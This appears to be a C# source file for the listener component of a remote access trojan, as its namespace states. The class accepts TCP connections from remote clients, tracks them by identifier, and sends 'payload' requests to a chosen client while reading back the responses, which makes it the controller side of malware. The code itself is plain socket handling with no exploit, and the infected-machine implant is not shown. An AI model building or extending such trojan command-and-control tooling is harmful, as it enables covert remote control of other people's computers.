using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using Company.Tools.RemoteAccessTrojan.Domain.Seedwork;
using Company.Tools.RemoteAccessTrojan.Infrastructure.CrossCutting;

namespace Company.Tools.RemoteAccessTrojan.Domain.Models
{
    public class Listener
    {
        #region Instances

        private Dictionary<SocketWrapper, Connection> _connections;

        #endregion

        #region Properties

        public bool IsStopped { get; set; }

        #endregion

        #region Methods

        #region Constructors

        internal Listener()
        {
            this._connections = new Dictionary<SocketWrapper, Connection>();
        }

        #endregion

        #region Exposed

        internal void Start()
        {
            var socket = new SocketWrapper(new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp));
            socket.Bind(new IPEndPoint(IPAddress.Parse(Config.Current.IpAddress), Config.Current.ListenPort));
            socket.Listen(Config.Current.MaxPendingConnections);

            var thread = new Thread(this.Communication_ListenIncoming);
            thread.Start(socket);
        }

        internal void Stop()
        {
            this.IsStopped = true;
            foreach (var client in this._connections.Keys)
                client.Close();
        }

        internal string SendPayload(Guid connectionIdentifier, string request)
        {
            var socket = this._connections.Where(x => x.Value.Identifier == connectionIdentifier)
                                          .Select(x => x.Key)
                                          .Single();
            var response = this.Communication_SendPayload(socket, request);
            return response;
        }

        #endregion

        #region Communication

        private void Communication_ListenIncoming(object state)
        {
            var socket = (SocketWrapper)state;

            while (true)
            {
                var client = socket.Accept();
                if (!this.IsStopped)
                {
                    var thread = new Thread(this.Communication_ProcessResponse);
                    thread.Start(client);
                }
                else
                {
                    break;
                }
            }
        }

        private void Communication_ProcessResponse(object state)
        {
            var client = (SocketWrapper)state;

            if (!this._connections.ContainsKey(client))
            {
                var connection = Connection.Parse(client.ReadString());
                this._connections.Add(client, connection);
                this.OnConnectionEstablished(new ConnectionEventArgs(connection));
            }
        }

        private string Communication_SendPayload(SocketWrapper client, string request)
        {
            int sent = client.WriteString(request);
            var response = client.ReadString();
            return response;
        }

        #endregion

        #region Events

        public event EventHandler<ConnectionEventArgs> ConnectionEstablished;

        protected virtual void OnConnectionEstablished(ConnectionEventArgs e)
        {
            EventHandler<ConnectionEventArgs> handler = this.ConnectionEstablished;
            if (handler != null) handler(this, e);
        }

        #endregion

        #endregion
    }
}